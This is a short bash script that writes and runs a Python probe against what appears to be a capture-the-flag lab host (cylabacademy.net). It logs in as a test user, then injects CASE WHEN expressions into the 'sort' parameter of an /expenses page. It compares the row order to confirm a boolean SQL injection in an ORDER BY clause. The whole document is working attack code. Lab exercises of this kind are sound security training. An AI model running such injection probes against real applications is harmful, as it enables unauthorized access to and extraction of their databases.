#!/bin/bash
cat > /tmp/o752.py <<'EOF'
import re, requests, sys
requests.packages.urllib3.disable_warnings()
A = "http://xebec.cylabacademy.net:17222"
s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0"})
r = s.post(A + "/login", data={"username": "hacker1", "password": "pass1234"}, timeout=20, allow_redirects=True)
print("login:", r.status_code, "connecte:", "/logout" in r.text)

def order(sort):
    r = s.get(A + "/expenses", params={"sort": sort}, timeout=20)
    if r.status_code != 200:
        return "HTTP%d" % r.status_code
    m = re.findall(r"<td>(AAA|BBB)</td>", r.text)
    return m[0] if m else "NONE"

for q in ("amount", "-amount", "amount DESC",
          "(CASE WHEN 1=1 THEN amount ELSE -amount END)",
          "(CASE WHEN 1=0 THEN amount ELSE -amount END)"):
    print("%-48s -> %s" % (q, order(q)))
EOF
python3 /tmp/o752.py
